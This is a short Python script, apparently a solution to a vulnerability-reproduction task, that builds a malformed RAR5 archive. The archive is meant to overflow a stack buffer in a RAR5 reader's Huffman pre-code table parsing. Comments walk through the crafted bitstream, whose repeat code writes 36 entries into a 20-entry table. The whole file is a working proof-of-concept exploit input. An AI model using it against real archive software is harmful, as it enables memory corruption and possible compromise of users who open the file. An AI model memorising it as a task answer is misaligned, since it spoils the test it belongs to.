import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in RAR5 reader.
        Targeting the Huffman table parsing logic where RLE checks are insufficient.
        """
        def to_varint(n):
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)

        # 1. RAR5 Signature
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        # 2. Main Archive Header
        # Type=1, Flags=0, Extra=0, Data=0
        # Body: ArchFlags=0
        mh_fields = to_varint(1) + to_varint(0) + to_varint(0)
        mh_size = to_varint(len(mh_fields))
        mh_crc = struct.pack('<I', zlib.crc32(mh_fields) & 0xFFFFFFFF)
        main_header = mh_crc + mh_size + mh_fields

        # 3. Payload (Compressed Data)
        # We target the Pre-Code Huffman table (size 20).
        # We craft a bitstream that writes 19 entries, then triggers a repeat code
        # that writes well past the 20th entry, causing a stack buffer overflow.
        
        # Bitstream construction (Little Endian):
        # - 18 nibbles of '1' (entries 0-17) -> 9 bytes of 0x11
        # - Nibble '1' (entry 18) and Nibble '15' (entry 19, code 15=repeat) -> 0xF1
        # - Nibble '15' (count for repeat: 15+2=17 zeros) and Nibble '0' (padding) -> 0x0F
        # Total written: 19 + 17 = 36 > 20.
        
        bit_data = b'\x11' * 9 + b'\xF1\x0F'
        bit_data += b'\x00' * 8  # Safe padding

        # Inner Block Header in the compressed stream
        # Flags: 0x80 (Table Present)
        # Checksum: CRC32(Flags + SizeBytes) & 0xFF
        # Size: VarInt(len(bit_data))
        block_flags = b'\x80'
        block_size_bytes = to_varint(len(bit_data))
        
        crc_data = block_flags + block_size_bytes
        block_crc_val = zlib.crc32(crc_data) & 0xFF
        block_checksum = struct.pack('B', block_crc_val)
        
        payload = block_flags + block_checksum + block_size_bytes + bit_data

        # 4. File Header
        # Type=2, Flags=0x0001 (Has Data)
        # Compression: Method 1 (Fastest) -> 0x01
        # HostOS=0
        # NameLen=1, Name='a'
        # DataSize, UnpackedSize
        fh_fields = to_varint(2) + to_varint(0x0001)
        fh_fields += to_varint(0x01)
        fh_fields += to_varint(0)
        fh_fields += to_varint(1)
        fh_fields += b'a'
        fh_fields += to_varint(len(payload))
        fh_fields += to_varint(len(payload)) # Unpacked size (arbitrary, using payload len)
        
        fh_size = to_varint(len(fh_fields))
        fh_crc = struct.pack('<I', zlib.crc32(fh_fields) & 0xFFFFFFFF)
        file_header = fh_crc + fh_size + fh_fields

        # Combine all parts
        return sig + main_header + file_header + payload
